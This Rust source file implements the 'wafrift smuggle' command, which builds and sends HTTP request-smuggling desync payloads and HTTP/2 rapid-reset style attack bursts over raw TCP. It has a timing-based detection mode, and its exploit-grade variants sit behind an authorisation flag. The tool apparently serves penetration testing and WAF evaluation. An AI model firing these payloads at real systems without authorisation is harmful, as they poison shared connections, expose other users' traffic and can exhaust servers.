//! `wafrift smuggle`: HTTP request smuggling probes (CL.TE / TE.CL /
//! TE.TE / CL.0 / chunk-extension / dual-CL / multi-value-CL, plus the
//! CVE-class rapid-reset / made-you-reset / settings-storm, see the
//! `VARIANTS` catalogue / `wafrift smuggle list` for the live set). NOTE:
//! `h2c_smuggle` exists in the `wafrift-smuggling` crate but is NOT wired
//! into this CLI command (do not list it here as available).
//!
//! ## Design
//!
//! Built on top of the `wafrift-smuggling` crate, which materialises
//! every byte of the wire payload. We use a raw `tokio::net::TcpStream`
//! (NOT reqwest) because any conforming HTTP client normalises the
//! headers, and normalising the headers DEFEATS the desync. The
//! whole point of the attack is that the WAF / front-end parses the
//! payload one way and the origin parses it another, so the bytes
//! must reach the wire exactly as constructed.
//!
//! ## Subcommands
//!
//! * `wafrift smuggle list`: enumerate the variants the engine
//!   knows about, with their safety tier.
//!
//! * `wafrift smuggle dry-run --variant <V> --host <H> --smuggled-prefix <P>`
//!   render the raw wire bytes the variant would send. No network. The
//!   single fastest way to inspect what wafrift would do, and the basis
//!   for replaying with `nc`, `curl --raw`, or any other transport.
//!
//! * `wafrift smuggle detect <HOST>`: the SAFE default. Fires only
//!   the two timing-differential detection probes (CL.TE / TE.CL
//!   with a short Content-Length that causes the back-end parser to
//!   HANG waiting for bytes that never arrive, while the front-end
//!   parser thinks the request is complete and returns immediately).
//!   Compares per-probe response latency against a baseline of N
//!   benign GETs. A delta > `--threshold-ms` is a desync signal.
//!   These probes do NOT poison the connection pool, they cause a
//!   one-shot hang that times out cleanly.
//!
//! * `wafrift smuggle probe <HOST> --variant <V>`: gated behind
//!   `--unsafe`. Fires exploit-grade payloads that DO desynchronise
//!   the connection. The next request on the poisoned socket may
//!   receive the smuggled response, which is exactly the goal, but
//!   it can also cascade into unrelated user traffic on shared
//!   connection pools. Authorisation required, banner printed.
//!
//! ## Safety
//!
//! Exploit-grade variants are gated by the `unsafe-probes` cargo
//! feature in `wafrift-smuggling`, and additionally by the runtime
//! `--unsafe` flag here. Detection-only probes are always safe to
//! run on targets you have authorisation to test.

use clap::{Args, Subcommand};
use colored::Colorize;
use std::net::SocketAddr;
use std::process::ExitCode;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpStream, lookup_host};
use tokio::time::timeout;
use tracing::{debug, info, warn};
use wafrift_smuggling::smuggling::{
    self, SmugglingPayload, cl_zero, detect_cl_te, detect_te_cl, dual_cl, multi_value_cl, te_cl,
    te_te,
};

#[derive(Args, Debug)]
pub(crate) struct SmuggleArgs {
    #[command(subcommand)]
    pub action: SmuggleAction,
}

#[derive(Args, Debug)]
pub(crate) struct ListArgs {
    /// Output format: `text` (default, human-readable table) or `json`
    /// (structured array of variant objects (suitable for scripting)).
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,
}

#[derive(Subcommand, Debug)]
pub(crate) enum SmuggleAction {
    /// Enumerate the smuggling variants the engine ships, with
    /// their safety tier.
    List(ListArgs),

    /// Render the raw wire bytes of a smuggling payload without
    /// sending anything.
    DryRun(DryRunArgs),

    /// Detect a desync via timing differential, fires only the
    /// SAFE detection probes (CL.TE / TE.CL with a short
    /// Content-Length that hangs the back-end without poisoning
    /// the connection pool).
    Detect(DetectSmuggleArgs),

    /// Fire an exploit-grade smuggling payload. Gated by
    /// `--unsafe`. Will poison the connection pool, the next
    /// request on the socket may receive the smuggled response.
    Probe(ProbeSmuggleArgs),
}

#[derive(Args, Debug)]
pub(crate) struct DryRunArgs {
    /// Variant to render.
    #[arg(long, value_parser = parse_variant_name)]
    pub variant: VariantSelector,

    /// Host the payload claims to target (goes into the `Host:` header).
    /// Accepts either a bare hostname (`example.com`) or a full URL
    /// (`https://example.com`) (the scheme and path are stripped).
    #[arg(long, alias = "target", value_parser = parse_host_or_url)]
    pub host: String,

    /// Optional smuggled request prefix (for CL.TE / TE.CL / etc.).
    /// Use `\r\n` to embed CRLF. Defaults to a benign GET /admin so
    /// the dry-run is always meaningful.
    #[arg(long, default_value = "GET /admin HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n")]
    pub smuggled_prefix: String,

    /// Output format (`raw` or `hex`).
    #[arg(long, default_value = "raw", value_parser = ["raw", "hex"])]
    pub format: String,
}

#[derive(Args, Debug)]
pub(crate) struct DetectSmuggleArgs {
    /// Host to probe (e.g. `example.com`). Resolved via DNS.
    pub host: String,

    /// Port (default 80).
    #[arg(long, default_value_t = 80)]
    pub port: u16,

    /// Number of benign baseline GETs to time before firing the
    /// detection probes.
    #[arg(long, default_value_t = 3)]
    pub baseline_samples: u8,

    /// Connection / read timeout for a single probe.
    #[arg(long, default_value_t = 8)]
    pub timeout_secs: u64,

    /// Latency delta (probe − baseline) above which a desync is
    /// reported. Tune up for chatty networks.
    #[arg(long, default_value_t = 1500)]
    pub threshold_ms: u64,

    /// `text` (default) or `json`.
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,
}

#[derive(Args, Debug)]
pub(crate) struct ProbeSmuggleArgs {
    /// Host to probe.
    pub host: String,

    /// Variant to fire.
    #[arg(long, value_parser = parse_variant_name)]
    pub variant: VariantSelector,

    /// Port (default 80).
    #[arg(long, default_value_t = 80)]
    pub port: u16,

    /// Smuggled request prefix.
    #[arg(long, default_value = "GET /admin HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n")]
    pub smuggled_prefix: String,

    /// Required acknowledgement that you have authorisation to
    /// poison this target's connection pool. Without `--unsafe`,
    /// the probe is refused, exploit-grade payloads can affect
    /// concurrent user traffic on shared connections.
    #[arg(long)]
    pub r#unsafe: bool,

    /// Timeout per probe.
    #[arg(long, default_value_t = 8)]
    pub timeout_secs: u64,

    /// Output format.
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,
}

/// One slot in the variant catalogue, what the engine can build,
/// plus the human-readable explanation and safety tier.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum SafetyTier {
    /// Times-out the back-end without poisoning the socket.
    Detection,
    /// Will desync the connection pool. Authorisation required.
    Exploit,
}

#[derive(Debug, Clone)]
pub(crate) struct VariantInfo {
    pub key: &'static str,
    pub long_name: &'static str,
    pub tier: SafetyTier,
    pub description: &'static str,
}

/// The CLI-visible variant menu. Every key here is what `--variant`
/// accepts; the safety tier gates whether `--unsafe` is required.
pub(crate) const VARIANTS: &[VariantInfo] = &[
    VariantInfo {
        key: "detect-cl-te",
        long_name: "Detect CL.TE",
        tier: SafetyTier::Detection,
        description: "Short Content-Length forces the back-end to hang waiting for chunked bytes; safe timing probe.",
    },
    VariantInfo {
        key: "detect-te-cl",
        long_name: "Detect TE.CL",
        tier: SafetyTier::Detection,
        description: "Mismatched CL+TE causes back-end hang; safe timing probe.",
    },
    VariantInfo {
        key: "cl-te",
        long_name: "Classic CL.TE",
        tier: SafetyTier::Exploit,
        description: "Front-end honours Content-Length, back-end honours Transfer-Encoding, smuggled prefix becomes a separate request on the back-end.",
    },
    VariantInfo {
        key: "te-cl",
        long_name: "Classic TE.CL",
        tier: SafetyTier::Exploit,
        description: "Reverse of CL.TE: front-end honours TE, back-end honours CL.",
    },
    VariantInfo {
        key: "te-te",
        long_name: "TE.TE obfuscation",
        tier: SafetyTier::Exploit,
        description: "Both parsers honour TE but only one accepts the obfuscated header form (whitespace / unicode / quoting); cycles through the Smuggler matrix.",
    },
    VariantInfo {
        key: "cl-0",
        long_name: "CL.0",
        tier: SafetyTier::Exploit,
        description: "Content-Length: 0 with body, back-end that ignores CL=0 reads the body as a smuggled request.",
    },
    VariantInfo {
        key: "dual-cl",
        long_name: "Dual Content-Length",
        tier: SafetyTier::Exploit,
        description: "Two Content-Length headers with different values; parsers disagree on which wins.",
    },
    VariantInfo {
        key: "multi-cl",
        long_name: "Multi-value CL",
        tier: SafetyTier::Exploit,
        description: "Content-Length: 5, 10, comma-separated values; some parsers take the first, some the last.",
    },
    // R69 pass-21: CVE-2025-55315 chunk-extension TERM.EXT with lone-LF.
    VariantInfo {
        key: "chunk-ext-lone-lf",
        long_name: "CVE-2025-55315 chunk-ext lone-LF",
        tier: SafetyTier::Exploit,
        description: "Bare LF inside chunk-extension splits the stream for LF-tolerant proxies (Akamai/F5); CR-only parsers (Kestrel) see it as extension noise. CVSS 9.9.",
    },
    // R69 pass-21: rapid-reset library variants surfaced through the
    // CLI so operators can drive them via `wafrift smuggle probe
    // --variant <K> --unsafe`. The library implementations have lived
    // in `wafrift-smuggling::rapid_reset` since pass-13; the CLI
    // wiring was the outstanding gap per pass-20 F2 (R-RR1..R-RR3).
    VariantInfo {
        key: "rapid-reset",
        long_name: "CVE-2023-44487 classic rapid reset",
        tier: SafetyTier::Exploit,
        description: "HTTP/2 HEADERS + immediate RST_STREAM, repeated, exhausts server stream-creation work without DATA.",
    },
    VariantInfo {
        key: "made-you-reset",
        long_name: "CVE-2025-8671 MadeYouReset",
        tier: SafetyTier::Exploit,
        description: "PRIORITY frame referencing a closed stream as exclusive dep, then HEADERS, servers that process PRIORITY before stream-liveness check emit internal RST.",
    },
    VariantInfo {
        key: "settings-storm",
        long_name: "HTTP/2 SETTINGS storm",
        tier: SafetyTier::Exploit,
        description: "Alternating SETTINGS frames forcing peer to re-apply settings, compounds state churn.",
    },
    // ── Kettle BH-USA 2025 "HTTP/1.1 Must Die: The Desync Endgame" ──
    // Frontier desync primitives. The library implementations live in
    // `wafrift-smuggling::smuggling` (registered in KETTLE_DESYNC_PRIMITIVES)
    // and have been unit-tested since pass-13 but carried no CLI surface
    // these wire them through `build_payload` exactly like the rapid-reset
    // family above, so an operator can drive each via
    // `wafrift smuggle probe --variant <K> --unsafe`. All Exploit-tier: each
    // either carries a smuggled request or sends malformed framing that can
    // desync routing on a shared connection.
    VariantInfo {
        key: "zero-cl-desync",
        long_name: "0.CL desync: Kettle BH25 §3.1",
        tier: SafetyTier::Exploit,
        description: "Front-end ignores Content-Length and routes on method/path; back-end honours CL and reads the smuggled bytes. Uses the IIS reserved-path (/con) early-response gadget so the poison stays buffered.",
    },
    VariantInfo {
        key: "expect-100-desync",
        long_name: "Expect: 100-continue 0.CL abuse. Kettle BH25 §5.1",
        tier: SafetyTier::Exploit,
        description: "Front-end answers 100-continue immediately and treats the body as consumed (0 bytes); back-end honours Content-Length and reads the smuggled request off the shared socket.",
    },
    VariantInfo {
        key: "cl-0-via-expect",
        long_name: "CL.0 via Expect on /images/. Kettle BH25 §5.3",
        tier: SafetyTier::Exploit,
        description: "POST /images/ + Expect: 100-continue, static/image endpoints answer early (405/100), giving a CL.0 equivalent; the back-end routes elsewhere and reads the smuggled body.",
    },
    VariantInfo {
        key: "double-desync",
        long_name: "Double desync 0.CL→CL.0. Kettle BH25 §6",
        tier: SafetyTier::Exploit,
        description: "Two pipelined frames: a 0.CL frame plants the head of a CL.0 attack in the back-end buffer, a following CL.0 frame completes it, converts a self-contained primitive into a victim-affecting desync.",
    },
    VariantInfo {
        key: "expect-100-obf",
        long_name: "Obfuscated Expect: Kettle BH25 §5.2",
        tier: SafetyTier::Exploit,
        description: "Trailing-space `100-continue ` Expect value, one parser recognises the directive, the other does not, splitting the body-consumed decision. Canonical pick; the library emits the full whitespace/case matrix.",
    },
    VariantInfo {
        key: "vh-masked-host",
        long_name: "V-H header masking. Kettle BH25 §4.2",
        tier: SafetyTier::Exploit,
        description: "Leading-space Host line, visible to the front-end parser, ignored or misrouted by the back-end. Space-prefix pick; the library also emits the name-rewrite (Host→Xost) form.",
    },
    VariantInfo {
        key: "malformed-host-split",
        long_name: "H-V malformed Host ALB+IIS. Kettle BH25 §7",
        tier: SafetyTier::Exploit,
        description: "Delimiter byte inside the Host value. AWS ALB 400s it, IIS accepts and reroutes; on a poisoned connection IIS-processed responses reach victims. First-delimiter pick; the library emits all eight.",
    },
    VariantInfo {
        key: "chunk-ext-keyval",
        long_name: "Chunk-extension key=value confusion. Kettle BH25 §10",
        tier: SafetyTier::Exploit,
        description: "`5;x=y` chunk-extension, strict parsers reject the extension, lenient ones accept it, disagreeing on where chunk data ends. Complements chunk-ext-lone-lf with the key=value form. Canonical pick of the library's eight extension shapes.",
    },
    // ── Additional library smuggling primitives ──
    // Public in `wafrift-smuggling::smuggling` (listed in `all_payloads`) but
    // previously un-surfaced by the CLI; wired here through `build_payload`
    // with the same raw-TCP delegation as the Kettle family above. All
    // Exploit-tier: each carries a smuggled request in a body/stream.
    VariantInfo {
        key: "method-body",
        long_name: "GET-with-body smuggling",
        tier: SafetyTier::Exploit,
        description: "GET request carrying a Content-Length body. RFC discourages bodies on GET, so front-end and back-end disagree on whether the body belongs to THIS request or starts the next; the smuggled prefix rides in the body.",
    },
    VariantInfo {
        key: "http10-persistence",
        long_name: "HTTP/1.0 persistence disagreement",
        tier: SafetyTier::Exploit,
        description: "HTTP/1.0 + Connection: keep-alive (a 1.0 extension, not core), front-end and back-end disagree on whether the connection persists, desyncing the next request on a reused socket.",
    },
    VariantInfo {
        key: "http09-downgrade",
        long_name: "HTTP/0.9 simple-request downgrade",
        tier: SafetyTier::Exploit,
        description: "Bare `GET /` with no HTTP-version token (HTTP/0.9 simple request), servers that still honour 0.9 read the following bytes as a fresh request; proxies that don't may forward them verbatim, splitting the stream.",
    },
    VariantInfo {
        key: "cl-obfuscation",
        long_name: "Content-Length value obfuscation",
        tier: SafetyTier::Exploit,
        description: "Content-Length with a non-canonical value form (`+5`, `05`, `5 `, tab-prefixed), lenient parsers accept the obfuscated length, strict ones reject or read a different count, disagreeing on the body boundary. Canonical pick of the library's four.",
    },
    VariantInfo {
        key: "chunk-size-mutation",
        long_name: "Chunk-size formatting mutation",
        tier: SafetyTier::Exploit,
        description: "Chunked body whose chunk-SIZE line uses a non-canonical form (leading zeros / uppercase hex / trailing `;` / tab), parsers disagree on the chunk length, splitting the stream. Canonical pick of the library's four. (Distinct from chunk-ext-*, which mutate the extension, not the size.)",
    },
];

/// Wrapper for the `--variant` arg, parses the string key to a
/// `VariantInfo` so the dispatch logic stays data-driven.
#[derive(Debug, Clone, Copy)]
pub(crate) struct VariantSelector {
    pub info: &'static VariantInfo,
}

/// Accept either a bare hostname or a full URL; strip scheme + path so
/// `--host example.com` and `--target https://example.com/path` both
/// produce the same `Host:` header value (`example.com`).
fn parse_host_or_url(s: &str) -> Result<String, String> {
    // If it looks like a URL (contains "://"), parse and extract the host.
    if let Some(rest) = s
        .strip_prefix("http://")
        .or_else(|| s.strip_prefix("https://"))
    {
        // rest is "host/path?query" (take up to the first '/' or ')?'
        let host = rest.split(['/', '?', '#']).next().unwrap_or(rest);
        if host.is_empty() {
            return Err(format!("no host found in URL `{s}`"));
        }
        Ok(host.to_string())
    } else {
        // Bare hostname (or host:port) (pass through as-is).
        Ok(s.to_string())
    }
}

fn parse_variant_name(s: &str) -> Result<VariantSelector, String> {
    let key = s.to_ascii_lowercase();
    for v in VARIANTS {
        if v.key == key {
            return Ok(VariantSelector { info: v });
        }
    }
    let known: Vec<_> = VARIANTS.iter().map(|v| v.key).collect();
    Err(format!(
        "unknown variant `{s}`. Known: {}",
        known.join(", ")
    ))
}

/// Render escaped `\r\n` / `\t` sequences in the user-supplied
/// smuggled prefix to actual CRLF bytes, operators paste the
/// human-readable form on the command line, we restore the wire
/// form before handing it to the engine.
#[must_use]
pub(crate) fn unescape_prefix(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.peek() {
                Some('r') => {
                    out.push('\r');
                    chars.next();
                }
                Some('n') => {
                    out.push('\n');
                    chars.next();
                }
                Some('t') => {
                    out.push('\t');
                    chars.next();
                }
                Some('\\') => {
                    out.push('\\');
                    chars.next();
                }
                _ => out.push(c),
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// Build the engine-side payload from the variant selector + args.
/// All dispatch is data-driven from the `VariantInfo::key` so adding
/// a variant is one row in `VARIANTS` plus one match arm here.
/// Take the canonical (first) payload from a library fan-out that
/// returns a `Vec<SmugglingPayload>`, mapping the safety error to a
/// `String`. The smuggle CLI fires ONE payload per `--variant` key
/// the same single-representative contract as `te-te` (index 1) and
/// `chunk-ext-lone-lf`: and each library builder emits its canonical
/// variant first, so the head element is the one surfaced. The full
/// matrix stays reachable via the library for the probe aggregator and
/// property suites.
fn first_payload(
    v: Result<Vec<SmugglingPayload>, wafrift_smuggling::safety::SafetyError>,
) -> Result<SmugglingPayload, String> {
    v.map_err(|e| format!("{e}"))?
        .into_iter()
        .next()
        .ok_or_else(|| "library variant set was unexpectedly empty".to_string())
}

fn build_payload(
    info: &VariantInfo,
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, String> {
    match info.key {
        "detect-cl-te" => detect_cl_te(host).map_err(|e| format!("{e}")),
        "detect-te-cl" => detect_te_cl(host).map_err(|e| format!("{e}")),
        "cl-te" => smuggling::cl_te(host, smuggled_prefix).map_err(|e| format!("{e}")),
        "te-cl" => te_cl(host, smuggled_prefix).map_err(|e| format!("{e}")),
        "te-te" => te_te(host, smuggled_prefix, 1).map_err(|e| format!("{e}")),
        "cl-0" => cl_zero(host, smuggled_prefix).map_err(|e| format!("{e}")),
        "dual-cl" => dual_cl(host, smuggled_prefix, 6, 5).map_err(|e| format!("{e}")),
        "multi-cl" => multi_value_cl(host, smuggled_prefix).map_err(|e| format!("{e}")),
        // R69 pass-21: CVE-2025-55315 chunk-extension TERM.EXT lone-LF.
        "chunk-ext-lone-lf" => {
            smuggling::chunk_extension_lone_lf(host, smuggled_prefix).map_err(|e| format!("{e}"))
        }
        // R69 pass-21: rapid_reset variants wired via the CLI, the
        // library functions live in `wafrift-smuggling::rapid_reset`.
        // Each returns raw HTTP/2 wire bytes inside a typed
        // descriptor; we extract `wire_bytes` and wrap in a
        // `SmugglingPayload` envelope so the rest of the dispatch
        // pipeline (canary, classification, JSON emission) is shared
        // with the H/1.x variants above.
        "rapid-reset" => {
            // 8 stream pairs × HEADERS+RST_STREAM. error_code 0x8 = CANCEL,
            // the canonical rapid-reset signal.
            let burst = wafrift_smuggling::rapid_reset::classic_rapid_reset(host, 8, 0x8);
            Ok(SmugglingPayload {
                description: "CVE-2023-44487 classic rapid reset burst".into(),
                variant: wafrift_smuggling::smuggling::SmugglingVariant::H2c,
                raw_bytes: burst.wire_bytes,
                canary: wafrift_smuggling::safety::Canary::generate(),
            })
        }
        "made-you-reset" => {
            // made_you_reset_burst returns a Vec<MadeYouResetProbe>
            // each carrying ONLY a PRIORITY+HEADERS pair, no client
            // preface. Prepend the canonical preface + initial
            // SETTINGS so the wire is a valid HTTP/2 session before
            // the per-probe frames arrive (matches the shape that
            // classic_rapid_reset emits).
            let probes = wafrift_smuggling::rapid_reset::made_you_reset_burst(host, 8);
            let mut wire = Vec::with_capacity(
                wafrift_smuggling::rapid_reset::CLIENT_PREFACE.len()
                    + 27
                    + probes.iter().map(|p| p.wire_bytes.len()).sum::<usize>(),
            );
            wire.extend_from_slice(wafrift_smuggling::rapid_reset::CLIENT_PREFACE);
            for p in &probes {
                wire.extend_from_slice(&p.wire_bytes);
            }
            Ok(SmugglingPayload {
                description: "CVE-2025-8671 MadeYouReset burst".into(),
                variant: wafrift_smuggling::smuggling::SmugglingVariant::H2c,
                raw_bytes: wire,
                canary: wafrift_smuggling::safety::Canary::generate(),
            })
        }
        "settings-storm" => {
            let storm = wafrift_smuggling::rapid_reset::settings_storm(16);
            Ok(SmugglingPayload {
                description: "HTTP/2 SETTINGS storm".into(),
                variant: wafrift_smuggling::smuggling::SmugglingVariant::H2c,
                raw_bytes: storm.wire_bytes,
                canary: wafrift_smuggling::safety::Canary::generate(),
            })
        }
        // ── Kettle BH-USA 2025 "The Desync Endgame" (KETTLE_DESYNC_PRIMITIVES).
        // Each delegates to the library primitive and (where the library
        // returns raw bytes / a fan-out) wraps or picks the canonical payload,
        // identical in shape to the rapid-reset arms above. The `cl` /
        // `attack_cl` arguments use the smuggled-prefix byte length so the
        // back-end is told to read exactly the smuggled request.
        "zero-cl-desync" => {
            // IIS reserved-path (/con) early-response gadget keeps the
            // poisoned bytes buffered instead of deadlocking the connection.
            smuggling::zero_cl_desync("/con", smuggled_prefix, smuggled_prefix.len())
                .map_err(|e| format!("{e}"))
        }
        "expect-100-desync" => {
            smuggling::expect_100_smuggle(smuggled_prefix, smuggled_prefix.len())
                .map_err(|e| format!("{e}"))
        }
        "cl-0-via-expect" => smuggling::cl_zero_via_expect(smuggled_prefix, smuggled_prefix.len())
            .map_err(|e| format!("{e}")),
        "double-desync" => {
            // Stage 1 path "/" (any 0.CL-triggering route), stage 2 the
            // protected target; the smuggled prefix is the final payload.
            // double_desync returns the raw bytes of BOTH pipelined frames,
            // so we wrap them in the shared envelope like the H2 arms above.
            let raw = smuggling::double_desync("/", "/admin", smuggled_prefix)
                .map_err(|e| format!("{e}"))?;
            Ok(SmugglingPayload {
                description: "Kettle BH25 double desync 0.CL→CL.0".into(),
                variant: wafrift_smuggling::smuggling::SmugglingVariant::KettleDesync,
                raw_bytes: raw,
                canary: wafrift_smuggling::safety::Canary::generate(),
            })
        }
        // ("", " ") = trailing-space canonical; the library emits the
        // caller-supplied pair FIRST, so first_payload returns exactly it.
        "expect-100-obf" => first_payload(smuggling::expect_100_obfuscated(
            "",
            " ",
            smuggled_prefix,
            smuggled_prefix.len(),
        )),
        "vh-masked-host" => first_payload(smuggling::vh_masked_header("Host", host)),
        "malformed-host-split" => first_payload(smuggling::malformed_host_split(host)),
        "chunk-ext-keyval" => first_payload(smuggling::chunk_extension_variants(smuggled_prefix)),
        // ── Additional library primitives (all_payloads members not previously
        // surfaced). Same delegation shape as the arms above. ──
        "method-body" => {
            // GET-with-body: the smuggled prefix rides in a CL-counted body on a GET.
            smuggling::method_body_smuggle("GET", host, smuggled_prefix).map_err(|e| format!("{e}"))
        }
        "http10-persistence" => first_payload(smuggling::http10_persistence(host, smuggled_prefix)),
        "http09-downgrade" => {
            smuggling::http09_downgrade(host, smuggled_prefix).map_err(|e| format!("{e}"))
        }
        "cl-obfuscation" => first_payload(smuggling::cl_obfuscation(host, smuggled_prefix)),
        "chunk-size-mutation" => {
            first_payload(smuggling::chunk_size_mutations(host, smuggled_prefix))
        }
        other => Err(format!(
            "variant `{other}` is in the catalogue but has no builder"
        )),
    }
}

/// Result of one timing probe: how long it took the back-end to
/// respond (or hang to timeout) compared to a benign baseline.
#[derive(Debug, Clone, serde::Serialize)]
pub(crate) struct DetectFinding {
    pub variant: String,
    pub elapsed_ms: u64,
    pub baseline_ms: u64,
    pub delta_ms: i64,
    pub threshold_ms: u64,
    pub desync_inferred: bool,
}

/// Open a raw TCP connection, send the payload bytes, return how
/// long we waited for the first byte (or until timeout). Times the
/// FIRST byte specifically, that's the most diagnostic signal: a
/// healthy back-end answers immediately, a desync'd one hangs until
/// it gives up on the truncated chunked body.
/// Resolve `host:port` to a single `SocketAddr` ONCE per command, every
/// subsequent connect uses the cached address, eliminating per-probe DNS
/// overhead. On networks where DNS lookups take ~50 ms each, a 3-sample
/// baseline + 2 detect probes used to pay 5 lookups (~250 ms) for the
/// same hostname; the resolved variant pays it once. Pure helper, no
/// I/O beyond the lookup itself.
///
/// Pass 20 R1 §1 SPEED.
pub(crate) async fn resolve_host_once(host: &str, port: u16) -> Result<SocketAddr, String> {
    lookup_host((host, port))
        .await
        .map_err(|e| format!("dns resolve {host}:{port}: {e}"))?
        .next()
        .ok_or_else(|| format!("dns resolve {host}:{port}: no addresses"))
}

async fn time_first_byte(addr: SocketAddr, bytes: &[u8], timeout_secs: u64) -> Result<u64, String> {
    let start = Instant::now();
    let stream_fut = TcpStream::connect(addr);
    let mut stream = match timeout(Duration::from_secs(timeout_secs), stream_fut).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => return Err(format!("tcp connect: {e}")),
        // F126: pre-fix returned `Ok(timeout_secs * 1000)` on CONNECT
        // timeout, conflating "host unreachable" with "back-end hung
        // on the response." If the connect timed out at 8 s but the
        // benign baseline connects fast (200 ms), the delta was
        // 7800 ms, false DESYNC inferred. The READ timeout below
        // is the genuine "back-end is hanging" signal we want; the
        // CONNECT timeout means the network never got us in. Surface
        // it as Err so the caller aborts the probe and the operator
        // gets "connect timeout" instead of a phantom desync.
        Err(_) => return Err(format!("tcp connect: timed out after {timeout_secs}s")),
    };
    if let Err(e) = stream.write_all(bytes).await {
        return Err(format!("tcp write: {e}"));
    }
    if let Err(e) = stream.flush().await {
        return Err(format!("tcp flush: {e}"));
    }
    let mut buf = [0u8; 64];
    let read_fut = stream.read(&mut buf);
    match timeout(Duration::from_secs(timeout_secs), read_fut).await {
        Ok(Ok(_)) => Ok(start.elapsed().as_millis() as u64),
        Ok(Err(_)) => Ok(start.elapsed().as_millis() as u64),
        // Read timeout IS the desync signal, back-end accepted the
        // request and is hanging on the truncated chunked body. Bin
        // it at the budget for the delta calculation.
        Err(_) => Ok(timeout_secs * 1000),
    }
}

/// Median latency over N baseline GETs, the per-host "this is how
/// long an honest request takes on this network right now" anchor
/// the detection probe is compared against.
async fn measure_baseline(
    addr: SocketAddr,
    host_header: &str,
    samples: u8,
    timeout_secs: u64,
) -> Result<u64, String> {
    if samples == 0 {
        return Ok(0);
    }
    let benign = format!("GET / HTTP/1.1\r\nHost: {host_header}\r\nConnection: close\r\n\r\n");
    let mut measurements = Vec::with_capacity(samples as usize);
    for _ in 0..samples {
        let ms = time_first_byte(addr, benign.as_bytes(), timeout_secs).await?;
        measurements.push(ms);
    }
    measurements.sort_unstable();
    Ok(measurements[measurements.len() / 2])
}

/// Classify a single timing measurement against the baseline.
/// Returns `desync_inferred = true` iff the probe took at least
/// `threshold_ms` LONGER than the baseline. Pure function, the I/O
/// already happened; this is the gate the test suite covers.
#[must_use]
pub(crate) fn classify_detection(
    elapsed_ms: u64,
    baseline_ms: u64,
    threshold_ms: u64,
) -> DetectFinding {
    let delta = elapsed_ms as i64 - baseline_ms as i64;
    DetectFinding {
        variant: String::new(),
        elapsed_ms,
        baseline_ms,
        delta_ms: delta,
        threshold_ms,
        desync_inferred: delta >= threshold_ms as i64,
    }
}

/// Desync-specific interpretation of the response to a fired exploit
/// payload, orthogonal to `smuggle-fire`'s `bypass_signal` (which answers
/// WAF block-vs-allow). This answers whether the front-end ACCEPTED the
/// desynchronising framing, the single most diagnostic thing about the
/// attack response that `run_probe` previously read but never classified.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "kebab-case")]
pub(crate) enum DesyncSignal {
    /// Front-end returned 400/501/505, it rejected the malformed framing;
    /// the desync was normalised away and this variant won't poison the pool.
    FramingRejected,
    /// Front-end returned a normal status, it forwarded the request as
    /// framed, so the desync is plausible; confirm with a replayed follow-up.
    FramingAccepted,
    /// No bytes returned and the read timed out, the classic desync hang
    /// (back-end waiting for body bytes the front-end won't forward).
    BackendHang,
    /// Connection closed with zero bytes (inconclusive).
    NoResponse,
    /// Bytes returned but not a parseable HTTP/1 response. HTTP/2 frames
    /// (rapid-reset family), a raw banner, or a corrupted partial desync.
    Anomalous,
}

impl DesyncSignal {
    /// Stable kebab-case label (matches the serde representation; pinned by
    /// a test so the two can't drift). Used for the human-readable line.
    #[must_use]
    pub(crate) fn as_str(self) -> &'static str {
        match self {
            Self::FramingRejected => "framing-rejected",
            Self::FramingAccepted => "framing-accepted",
            Self::BackendHang => "backend-hang",
            Self::NoResponse => "no-response",
            Self::Anomalous => "anomalous",
        }
    }

    /// One-line operator guidance: what this outcome means and the next move.
    #[must_use]
    fn guidance(self) -> &'static str {
        match self {
            Self::FramingRejected => {
                "front-end rejected the desync framing (this variant is normalised away; try an obfuscated variant (te-te / chunk-ext-lone-lf))."
            }
            Self::FramingAccepted => {
                "front-end accepted the framing, the desync is plausible; replay a benign follow-up on a fresh connection (nc/curl) to confirm the smuggled prefix surfaces on the next request."
            }
            Self::BackendHang => {
                "back-end hung with no response past the timeout (consistent with a CL/TE length disagreement (parser waiting for bytes the front-end won't forward))."
            }
            Self::NoResponse => {
                "connection closed with no bytes (inconclusive; the front-end may have dropped the malformed request)."
            }
            Self::Anomalous => {
                "received bytes that don't parse as an HTTP/1 response (inspect the preview above (could be HTTP/2 frames or a partial desync))."
            }
        }
    }
}

/// Map the parsed status + I/O outcome to a [`DesyncSignal`]. Pure, the
/// read already happened; this is the gate the test suite covers (mirrors
/// [`classify_detection`]). A parsed status line is the strongest signal:
/// the read may still "time out" afterwards on a keep-alive socket, which
/// is NOT a hang, so a present status wins over `timed_out`.
#[must_use]
pub(crate) fn classify_desync_outcome(
    parsed_status: Option<u16>,
    bytes_read: usize,
    timed_out: bool,
) -> DesyncSignal {
    match parsed_status {
        Some(400 | 501 | 505) => DesyncSignal::FramingRejected,
        Some(_) => DesyncSignal::FramingAccepted,
        None => {
            if bytes_read == 0 {
                if timed_out {
                    DesyncSignal::BackendHang
                } else {
                    DesyncSignal::NoResponse
                }
            } else {
                DesyncSignal::Anomalous
            }
        }
    }
}

async fn run_detect(args: DetectSmuggleArgs) -> ExitCode {
    // TRACING: probe start (operator can confirm parameters at debug level).
    debug!(
        target: "wafrift::smuggle",
        host = %args.host,
        port = args.port,
        baseline_samples = args.baseline_samples,
        timeout_secs = args.timeout_secs,
        threshold_ms = args.threshold_ms,
        "smuggle detect: starting timing-differential probes"
    );
    if args.format == "text" {
        eprintln!(
            "{} {}:{}  baseline={} samples, timeout={}s, threshold={}ms",
            "── wafrift smuggle detect ──".cyan().bold(),
            args.host.bold(),
            args.port,
            args.baseline_samples,
            args.timeout_secs,
            args.threshold_ms
        );
    }
    // Resolve once, every probe + baseline sample reuses the same
    // SocketAddr instead of paying DNS per call. Pass 20 R1 §1 SPEED.
